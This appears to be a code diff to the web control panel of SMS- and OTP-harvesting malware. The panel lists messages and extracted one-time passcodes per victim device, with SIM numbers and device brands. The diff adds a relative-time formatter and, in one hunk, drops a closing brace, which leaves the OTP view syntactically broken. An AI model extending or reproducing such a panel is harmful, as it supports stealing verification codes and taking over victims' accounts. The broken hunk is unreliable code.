@@ -194,6 +194,22 @@ function fmtDate(str){
   if(str.includes('-'))return str.slice(0,16);
   return fmtTime(str);
 }
+function timeAgo(ts){
+  if(!ts)return'';
+  const n=Number(ts);
+  if(!n)return fmtDate(ts);
+  const diff=Date.now()-n;
+  const sec=Math.floor(diff/1000);
+  if(sec<0)return'just now';
+  if(sec<60)return sec+'s ago';
+  const min=Math.floor(sec/60);
+  if(min<60)return min+'m ago';
+  const hr=Math.floor(min/60);
+  if(hr<24)return hr+'h ago';
+  const day=Math.floor(hr/24);
+  if(day<30)return day+'d ago';
+  return fmtDate(ts);
+}
 
 // === MEDIA ===
 function startMedia(){
@@ -510,15 +526,15 @@ function renderDetail(){
       ${otps.length?otps.map(s=>{
         const body=s.body||'';
         const ts=s.receivedDate||s.date||s.timestamp||'';
-        return `<div class="oi"><div class="h"><span>${getDeviceBrand(uid)||uid.slice(0,8)}</span><span>${fmtDate(ts)}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,150)}</div></div>`
-      }).join(''):'<div style="padding:20px;text-align:center;color:#00e5ff44;font-size:12px">NO OTPs</div>'}
+        return `<div class="oi"><div class="h"><span>${getDeviceBrand(uid)||uid.slice(0,8)}</span><span>${timeAgo(ts)}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,150)}</div></div>`
+      }).join(''):'<div style="padding:20px;text-align:center;color:#00e5ff44;font-size:12px">NO OTPs</div>'
     </div>`;
   }else if(dtTab==='sms'){
     document.getElementById('detailBody').innerHTML=`<div class="cd"><h3>📨 MESSAGES (${smsList.length})</h3>
       ${smsList.length?smsList.map(s=>{
         const body=s.body||'';
         const ts=s.receivedDate||s.date||s.timestamp||'';
-        return `<div class="smi"><div class="av">${getDeviceBrand(uid)[0]||'?'}</div><div class="b"><div class="n">${getDeviceBrand(uid)||uid.slice(0,8)}</div><div class="m">${body}</div><div class="t">${fmtDate(ts)}${s.sim_number?` | ${s.sim_number}`:''}</div></div></div>`
+        return `<div class="smi"><div class="av">${getDeviceBrand(uid)[0]||'?'}</div><div class="b"><div class="n">${getDeviceBrand(uid)||uid.slice(0,8)}</div><div class="m">${body}</div><div class="t">${timeAgo(ts)}${s.sim_number?` | ${s.sim_number}`:''}</div></div></div>`
       }).join(''):'<div style="padding:20px;text-align:center;color:#00e5ff44;font-size:12px">NO MESSAGES</div>'}
     </div>`;
   }
@@ -539,7 +555,7 @@ function showAllOtps(){
     const body=s.body||'';
     const uid=s.userId||'';
     const ts=s.receivedDate||s.date||s.timestamp||'';
-    html+=`<div class="oi"><div class="h"><span>${getDeviceBrand(uid)||uid.slice(0,8)}</span><span>${fmtDate(ts)}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,150)}</div></div>`
+    html+=`<div class="oi"><div class="h"><span>${getDeviceBrand(uid)||uid.slice(0,8)}</span><span>${timeAgo(ts)}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,150)}</div></div>`
   });
   html+=`${!otps.length?'<div style="padding:30px;text-align:center;color:#00e5ff44">NO OTPs</div>':''}`;
   document.getElementById('dashBody').innerHTML=html;
@@ -553,7 +569,7 @@ function renderAllSms(){
     const body=s.body||'';
     const uid=s.userId||'';
     const ts=s.receivedDate||s.date||s.timestamp||'';
-    html+=`<div class="smi" onclick="openDevice('${uid}')"><div class="av">${getDeviceBrand(uid)[0]||'?'}</div><div class="b"><div class="n">${getDeviceBrand(uid)||uid.slice(0,8)}</div><div class="m">${body}</div><div class="t">${fmtDate(ts)}</div></div></div>`
+    html+=`<div class="smi" onclick="openDevice('${uid}')"><div class="av">${getDeviceBrand(uid)[0]||'?'}</div><div class="b"><div class="n">${getDeviceBrand(uid)||uid.slice(0,8)}</div><div class="m">${body}</div><div class="t">${timeAgo(ts)}</div></div></div>`
   });
   html+=`${!all.length?'<div style="padding:30px;text-align:center;color:#00e5ff44;font-size:12px">NO MESSAGES</div>':''}`;
   if(all.length>200)html+=`<div style="text-align:center;padding:10px;color:#00e5ff44;font-size:10px">SHOWING 200 OF ${all.length}</div>`;
